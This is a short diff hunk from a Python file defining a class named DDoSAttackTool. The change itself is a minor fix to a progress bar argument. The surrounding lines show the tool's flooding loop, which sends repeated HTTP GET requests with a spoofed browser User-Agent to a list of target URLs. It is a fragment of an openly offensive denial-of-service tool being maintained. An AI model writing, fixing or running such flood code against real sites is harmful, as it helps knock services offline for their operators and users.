@@ -204,7 +204,7 @@ class DDoSAttackTool:
                 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
             }
 
-            with progressbar.ProgressBar(total=num_packets) as bar:
+            with progressbar.ProgressBar(max_value=num_packets) as bar:
                 for url in urls:
                     for i in range(num_packets):
                         requests.get(url, headers=headers)
